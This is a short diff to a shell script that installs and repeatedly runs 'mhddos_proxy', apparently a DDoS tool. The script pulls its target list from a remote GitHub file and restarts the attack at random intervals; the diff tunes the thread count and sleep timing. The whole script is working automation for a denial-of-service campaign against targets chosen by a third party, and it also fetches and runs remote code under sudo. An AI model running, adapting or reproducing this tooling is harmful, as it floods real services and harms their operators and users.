@@ -11,7 +11,7 @@ sudo rm -r mhddos_proxy
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 python3 -m pip install -r ~/mhddos_proxy/requirements.txt
 
-threads="${1:-800}"
+threads="${1:-700}"
 rpc="--rpc 2000"
 proxy_upd="-p 1800"
 debug="--debug"
@@ -20,7 +20,7 @@ debug="--debug"
 while true
 do
    pkill -f start.py; pkill -f runner.py 
-   sleep $[ ( $RANDOM % 10 )  + 1 ]m
+   sleep $[ ( $RANDOM % 15 )  + 1 ]m
    
    # Get number of targets. Sometimes list_size = 0 (network or github problem). So here is check to avoid script error.
    list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
